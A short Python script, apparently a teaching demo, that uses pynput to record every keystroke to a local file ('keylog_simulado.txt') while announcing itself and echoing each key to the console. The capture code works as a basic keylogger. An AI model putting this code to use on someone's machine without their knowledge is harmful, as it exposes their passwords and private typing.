import pynput.keyboard

log_file = "keylog_simulado.txt"

def on_press(key):
    """Função chamada a cada tecla pressionada."""
    try:
        # Tenta pegar o caractere da tecla
        char = str(key.char)
    except AttributeError:
        # Lida com teclas especiais (ex: Shift, Enter, Space)
        if key == pynput.keyboard.Key.space:
            char = " "
        elif key == pynput.keyboard.Key.enter:
            char = "\n"
        else:
            char = " [" + str(key) + "] "
    
    # Salva a tecla no arquivo de log
    with open(log_file, "a") as f:
        f.write(char)
        
    # Exibe a tecla no console (para fins didáticos e controle)
    print(f"Tecla capturada: {char.strip()}")


# Configura o listener para iniciar a captura
print("--- Keylogger Simulado Ativo (Pressione CTRL+C para parar) ---")
with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()